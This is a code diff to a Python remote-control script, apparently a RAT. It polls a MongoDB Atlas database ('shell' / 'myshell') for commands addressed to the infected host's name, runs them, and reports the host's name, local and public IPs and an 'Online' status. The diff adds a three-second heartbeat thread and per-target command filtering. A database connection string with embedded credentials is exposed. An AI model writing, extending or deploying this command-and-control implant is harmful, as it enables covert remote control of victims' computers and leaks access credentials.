@@ -12,6 +12,12 @@ import win32clipboard
 import gridfs
 import pyautogui
 import pygetwindow as gw
+from threading import Thread
+import time
+from datetime import date
+import datetime
+
+
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
@@ -26,12 +32,44 @@ except:
 
 hostname = socket.gethostname()
 IPAddr = socket.gethostbyname(hostname)
+LAST_SEEN=""
 
 def has_active_internet():
     if IPAddr=="127.0.0.1":
         return False
     else:
         return True
+
+def last_seen():
+    global LAST_SEEN
+
+    db=client['shell']
+    another_filter={
+    "hostname":hostname
+    }
+    sysinfo_col=db['systemInfo']
+    while True:
+        today=date.today()
+        times=datetime.datetime.now()
+        year=today.year
+        month=today.month
+        day=today.day
+
+        hour=times.hour
+        minutes=times.minute
+        second=times.second
+
+        LAST_SEEN=f'{year}-{month}-{day} {hour}:{minutes}:{second}'
+        value={
+            "$set":{"last_seen":LAST_SEEN}
+        }
+        try:
+            if sysinfo_col.find_one(another_filter):
+                sysinfo_col.update_one(another_filter,value)
+        except Exception as e:
+            print(e)
+        time.sleep(3)
+       
 
 def clearPrevData():
     db=client['shell']
@@ -305,6 +343,7 @@ def action_take(listen):
 
 
 def executes():
+    global LAST_SEEN
     db=client['shell']
     col=db['myshell']
     filters={
@@ -313,10 +352,22 @@ def executes():
     another_filter={
         "hostname":hostname
     }
+    
+    today=date.today()
+    times=datetime.datetime.now()
+    year=today.year
+    month=today.month
+    day=today.day
+    hour=times.hour
+    minutes=times.minute
+    second=times.second
+
     data={
             "hostname":hostname,
             "ip":str(IPAddr),
-            "public_ip":str(public_ip)
+            "public_ip":str(public_ip),
+            "last_seen":f'{year}-{month}-{day} {hour}:{minutes}:{second}',
+            "status":"Online"
         }
     sysinfo_col=db['systemInfo']
     try:
@@ -328,16 +379,21 @@ def executes():
     except Exception as e:
         print(e)
     while True:
-        internet=has_active_internet()
-        if internet:
             try:
                 listen=col.find_one(filters)
-                if listen:
+                if listen and listen['target']==hostname:
                     action_take(listen)
                     col.delete_one(filters)
             except Exception as e:
                 print(e)
-        else:
-            print("Waiting for stable connection....")
+        
 
-executes()
+def process():
+    internet=has_active_internet()
+    if internet:
+        Thread(target=executes).start()
+        Thread(target=last_seen).start()
+    else:
+        print("Waiting for stable connection....")
+
+process()
